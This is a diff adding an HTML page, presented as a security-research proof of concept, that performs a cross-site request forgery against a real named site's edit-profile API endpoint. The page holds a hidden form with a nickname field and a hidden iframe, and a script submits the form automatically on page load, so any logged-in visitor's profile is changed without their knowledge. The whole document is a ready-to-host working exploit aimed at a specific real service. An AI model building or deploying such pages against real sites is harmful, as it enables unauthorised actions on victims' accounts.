@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <title>CSRF Proof of Concept</title>
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            padding: 2rem;
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 1rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            background: linear-gradient(to right, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        .status {
+            color: #94a3b8;
+            font-size: 0.875rem;
+        }
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #FFF;
+            border-bottom-color: #38bdf8;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+            margin-bottom: 1rem;
+        }
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="loader"></span>
+        <h1>Security Research: CSRF Bypass Test</h1>
+        <p>Executing Proof of Concept...</p>
+        <p class="status">Target: https://my.bursamalaysia.com/api/v1/request/edit-profile</p>
+    </div>
+    
+    <form id="csrfForm" action="https://my.bursamalaysia.com/api/v1/request/edit-profile" method="POST" target="hidden_iframe">
+        <input type="hidden" name="nick_name" value="asdqwess">
+    </form>
+
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+    <script>
+        // Automatically submit the form on page load
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('csrfForm').submit();
+                console.log("PoC Executed");
+            }, 1000); // Slight delay for visual effect
+        };
+    </script>
+</body>
+</html>
